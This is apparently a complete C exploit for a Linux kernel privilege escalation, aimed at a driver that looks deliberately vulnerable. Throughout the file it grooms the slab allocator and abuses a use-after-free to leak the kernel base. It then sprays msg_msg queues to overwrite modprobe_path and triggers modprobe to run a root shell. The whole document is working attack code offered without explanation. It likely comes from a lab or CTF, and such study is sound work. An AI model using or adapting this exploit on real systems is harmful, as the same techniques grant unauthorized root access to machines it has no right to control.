#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include "drv.h"
#include "utils.h"
#include "msg_spray.h"

#define GET_ROOT "./get_root"
#define MY_SHELL "./my_shell"

#define SYS_KERN_MODPROBE "/proc/sys/kernel/modprobe"
#define ORIG_MODPROBE "/sbin/modprobe"

#define SLAB_128_OBJS_PER_SLAB 32
#define SLAB_128_CPU_PARTIAL 30
#define LEAK_DANGLING_START 2048
#define WRITE_DANGLING_START LEAK_DANGLING_START + 128

#define OFFSET_MNTNS_OPS 0x12439E0
#define OFFSET_MODPROBE_OPS 0x1E8B760

#define CPU_NUMBER 4
#define STACK_SIZE (1024*1024)
#define BUFFERSIZE 0x100

static char child_stack[STACK_SIZE];

static int childFunc(void *arg) {
    usleep(1000);
    exit(0);
}

unsigned long do_leak(int fd, int nTry) {
    int tid, status;
	pthread_t p_thread;
    unsigned int nObj=0, i;
    unsigned char bRun = 2;
    struct vuln_input vread = {0,};
    unsigned long res = 0;
    int j;
    unsigned int dangling_start = LEAK_DANGLING_START + nTry;

    printf("[+] Try leak...%d\n", nTry);
    //printf("  [-] Fill per_cpu freelist\n");
    for(i=0; i < SLAB_128_OBJS_PER_SLAB; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }
    nObj += SLAB_128_OBJS_PER_SLAB; 
    //printf("  [-] Fill partial freelist\n");
    // fill partial freelist
    for(i=0; i < SLAB_128_OBJS_PER_SLAB * SLAB_128_CPU_PARTIAL; i++){
        ioctl(fd, IOCTL_ALLOC, nObj+i);
    }

    nObj+= SLAB_128_OBJS_PER_SLAB * SLAB_128_CPU_PARTIAL; 
   // printf("  [-] Fill new full slab page\n");

    // fill remain half slab page
    for(i=nObj; i < SLAB_128_OBJS_PER_SLAB/2-1; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }

    // alloc vuln object
    ioctl(fd, IOCTL_ALLOC, dangling_start);

    // fill half slab page
    for(i=nObj; i < SLAB_128_OBJS_PER_SLAB/2; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }
    nObj+= SLAB_128_OBJS_PER_SLAB/2;

    // uaf vuln object
    ioctl(fd, IOCTL_VULN, dangling_start);

    for (int i = 0; i < 2*CPU_NUMBER; i++) {
        int pid = clone(childFunc, child_stack + STACK_SIZE, CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, 0);
    }

    vread.index = dangling_start;
    vread.pos = 1;
    res = ioctl(fd, IOCTL_READ64, &vread);

    if((vread.value&0xFFFFFFFF000009e0) == 0xFFFFFFFF000009e0){
        res = vread.value;
    }
    //free all
    for(i=0; i < nObj; i++){
        ioctl(fd, IOCTL_FREE, i);
    }
    return res;
}

unsigned long overwrite_modprobe_path(int fd, unsigned long addr, int nTry) {
    int tid, status;
	pthread_t p_thread;
    unsigned int nObj=0, i;
    unsigned char bRun = 2;
    struct vuln_input vread = {0,};
    struct vuln_input vwrite = {0,};
    unsigned long res = 0;
    int j;
    unsigned int dangling_start = WRITE_DANGLING_START + nTry;
    char buf[128] = {0,};

    memset(buf, 'A', 80);

    struct mq_attr attr = {
        .mq_flags   = 0,
        .mq_maxmsg  = 10,
        .mq_msgsize = BUFFERSIZE,
	    .mq_curmsgs = 0,
    };
    mqd_t mqid;
    mqid = mq_open("/qname", O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, &attr);

    //printf("  [-] Fill per_cpu freelist\n");
    for(i=0; i < SLAB_128_OBJS_PER_SLAB; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }
    nObj += SLAB_128_OBJS_PER_SLAB; 
    //printf("  [-] Fill partial freelist\n");
    // fill partial freelist
    for(i=0; i < SLAB_128_OBJS_PER_SLAB * SLAB_128_CPU_PARTIAL; i++){
        ioctl(fd, IOCTL_ALLOC, nObj+i);
    }

    nObj+= SLAB_128_OBJS_PER_SLAB * SLAB_128_CPU_PARTIAL; 
   // printf("  [-] Fill new full slab page\n");

    // fill remain half slab page
    for(i=nObj; i < SLAB_128_OBJS_PER_SLAB/2-1; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }

    // alloc vuln object
    ioctl(fd, IOCTL_ALLOC, dangling_start);

    // fill half slab page
    for(i=nObj; i < SLAB_128_OBJS_PER_SLAB/2; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }
    nObj+= SLAB_128_OBJS_PER_SLAB/2;

    // uaf vuln object
    ioctl(fd, IOCTL_VULN, dangling_start);

    spray_mqueue(mqid, buf, 8);

    vread.index = dangling_start;
    vread.pos = 6;
    res = ioctl(fd, IOCTL_READ64, &vread);

    if(vread.value != 0x4141414141414141)
        goto fail;

    printf("  [*] realloc msg_msg success\n");
    
    vwrite.index = vread.index;
    vwrite.pos = 0;
    vwrite.value = addr - 8 + 1;
    ioctl(fd, IOCTL_WRITE64, &vwrite);

    vread.pos = 1;
    res = ioctl(fd, IOCTL_READ64, &vread);
    vwrite.pos = 1;
    vwrite.value = (vread.value & 0xffffffff00000000) + 0x2f706d74;
    ioctl(fd, IOCTL_WRITE64, &vwrite);

    res = 1;
    printf("  [-] overwrite msg_msg success\n");
fail:
    gather_mqueue_nosave(mqid, 8);
    mq_close(mqid);

    //free all
    for(i=0; i < nObj; i++){
        ioctl(fd, IOCTL_FREE, i);
    }
    return res;
}


void read_kern_modprobe(char * buf, size_t len){
    FILE * fp = fopen(SYS_KERN_MODPROBE, "r");
    if(fp == NULL)
        return;
    fread(buf, 1, len, fp);
    fclose(fp);
}

int main(int argc, char * argv)
{
    unsigned long mntns_operations_addr = 0;
    unsigned long kernel_base = 0;
    unsigned long modprobe_path_addr = 0;

    char modprobe_path[128] = {0,};
    
    int child_pid, status = 0;
    int fd;
    int i,res=0;

    if( (child_pid = fork()) == 0 )
    {
        new_ns();
        int proc_self = open("/proc/self", O_RDONLY);
        fd = open(DEVICE_PATH, O_RDONLY);
        if (fd == -1) {
            perror("open");
            return -1;
        }
        pin_cpu(0);

        for(i=0; i<128; i++){
            mntns_operations_addr = do_leak(fd, i);
            if(mntns_operations_addr)
                break;
        }
        if(mntns_operations_addr == 0)
            goto fail;

        kernel_base = mntns_operations_addr - OFFSET_MNTNS_OPS;
        modprobe_path_addr = kernel_base + OFFSET_MODPROBE_OPS;

        printf("  [*] leak mntns_operations : %lx\n", mntns_operations_addr);
        printf("  [*] kernel base : %lx\n", kernel_base);
        printf("  [*] modprobe_path : %lx\n", modprobe_path_addr);
        printf("[+] overwrite modprobe_path\n");

        for(i=0; i<8; i++){
            res = overwrite_modprobe_path(fd, modprobe_path_addr, i);
            if(res)
                break;
        }
fail:
            close(fd);
            return 0;
    }

    printf("  [-] wait 2s\n");
    sleep(2);
    
    read_kern_modprobe(modprobe_path, 14);

    printf("  [*] modprobe path %s\n", modprobe_path);

    if(strcmp(modprobe_path, ORIG_MODPROBE))
    {
        copy_excutable(MY_SHELL, "/tmp/my_shell");
        copy_excutable(GET_ROOT, modprobe_path);
        socket(22, AF_INET, 0);
        system("/tmp/my_shell");
    }
    return 0;

}